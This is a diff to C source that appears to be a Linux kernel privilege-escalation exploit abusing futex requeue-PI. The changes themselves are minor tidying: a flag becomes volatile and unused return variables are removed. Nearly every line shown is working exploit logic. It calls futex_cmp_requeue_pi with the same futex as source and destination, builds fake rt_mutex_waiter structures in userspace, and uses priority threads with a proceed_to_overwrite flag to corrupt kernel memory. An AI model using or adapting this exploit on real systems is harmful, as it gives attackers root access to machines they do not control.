@@ -34,7 +34,7 @@
 
 futex_t destfutex = 0;
 futex_t srcfutex = 0;
-int proceed_to_overwrite = 0;
+volatile int proceed_to_overwrite = 0;
 unsigned long tbase;
 
 #define KERNABLE 0xa0000000
@@ -148,10 +148,9 @@ void *ger(void *arg){
 
 
 void *prio_thread(void *prio){
-	int ret;
 	setpriority(PRIO_PROCESS , 0, *(int*)prio);
 	printf("prio %d thread\n", *(int*)prio);
-	if((ret = futex_lock_pi(&destfutex, NULL, 0, 0)) < 0){
+	if(futex_lock_pi(&destfutex, NULL, 0, 0) < 0){
 		perror("futex_lock_pi");
 	}
 	printf("prio thread %d has destfutex\n",*(int*)prio);
@@ -163,7 +162,7 @@ void *prio_thread(void *prio){
 
 int main(int argc, char **argv){
 	pthread_t w1,l1,l2;
-	int ret,prio;
+	int prio;
   	struct rt_mutex_waiter *fake_userspace_waiter,*overwrite_waiter,*kernel_waiter;	
 	
 
@@ -185,23 +184,23 @@ int main(int argc, char **argv){
 	CPU_ZERO(&mask);
 	CPU_SET(0, &mask);
 
-	if((ret  = sched_setaffinity(getpid(), sizeof(mask), &mask)) < 0){
+	if(sched_setaffinity(getpid(), sizeof(mask), &mask) < 0){
 		perror("sched_setaffinity");
 	}
 
-	if((ret = futex_lock_pi(&destfutex, NULL, 0, 0)) < 0){
+	if(futex_lock_pi(&destfutex, NULL, 0, 0) < 0){
 		perror("futex_lock_pi");
 	}
 
 	prio = 16;
-	if ((ret = pthread_create(&w1, NULL, ger, &prio)) != 0) {
+	if (pthread_create(&w1, NULL, ger, &prio) != 0) {
 			perror("pthread_create\n");
 	}
 
 	sleep(1);
 	
 
-	if((ret  = futex_cmp_requeue_pi(&srcfutex, srcfutex, &destfutex, 1, 2, 0)) < 0){
+	if(futex_cmp_requeue_pi(&srcfutex, srcfutex, &destfutex, 1, 2, 0) < 0){
 		perror("futex_cmp_requeue_pi");
 	}
 
@@ -224,14 +223,14 @@ int main(int argc, char **argv){
 	sem_values[0] = 0xffff;	// make the syscall return asap, this check happens after copying
 
 	destfutex = 0;
-	if((ret  = futex_cmp_requeue_pi(&destfutex, 0, &destfutex, 1, 0, 0)) < 0){
+	if(futex_cmp_requeue_pi(&destfutex, 0, &destfutex, 1, 0, 0) < 0){
 		perror("bugged futex_cmp_requeue_pi"); 
 	}
 
 	usleep(500000);
 
 	prio = 15;
-	if ((ret = pthread_create(&l1, NULL, prio_thread, &prio)) != 0) {
+	if (pthread_create(&l1, NULL, prio_thread, &prio) != 0) {
 			perror("pthread_create\n");
 	}
 
@@ -252,7 +251,7 @@ int main(int argc, char **argv){
 	proceed_to_overwrite = 1;
 	usleep(1000);
 	prio = 14;
-	if ((ret = pthread_create(&l2, NULL, prio_thread, &prio)) != 0) {
+	if (pthread_create(&l2, NULL, prio_thread, &prio) != 0) {
 			perror("pthread_create\n");
 	}
 	usleep(500000);
